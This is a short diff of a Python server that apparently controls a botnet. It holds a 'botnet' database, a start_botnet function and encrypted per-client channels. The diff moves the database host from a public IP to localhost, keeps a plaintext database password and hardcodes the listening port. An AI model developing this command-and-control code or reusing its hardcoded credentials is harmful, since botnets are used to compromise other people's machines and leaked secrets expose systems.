@@ -13,8 +13,8 @@ import select
 #from env import *
 
 
-DBHOST = "51.77.193.65"
-DBUSER = "root"
+DBHOST = "127.0.0.1"
+DBUSER = "mysql"
 DBPASSWORD = "jesuislepython3"
 DB = "botnet"
 
@@ -45,7 +45,6 @@ def reception(queue, conn, addr):
 
 
 def start_botnet(port, queue_web):
-    if not port or port < 1023 or port > 65535:
         print("démarrage du serveur sur le port " + str(port))
 
         # (addr, conn, thread_emission, emission_queue, thread_reception, reception_queue, sym_key, iv)
@@ -53,7 +52,8 @@ def start_botnet(port, queue_web):
 
         # Socket
         host = "127.0.0.1"
-        port = port
+        #port = port
+        port = 4242
 
         socket_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         socket_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
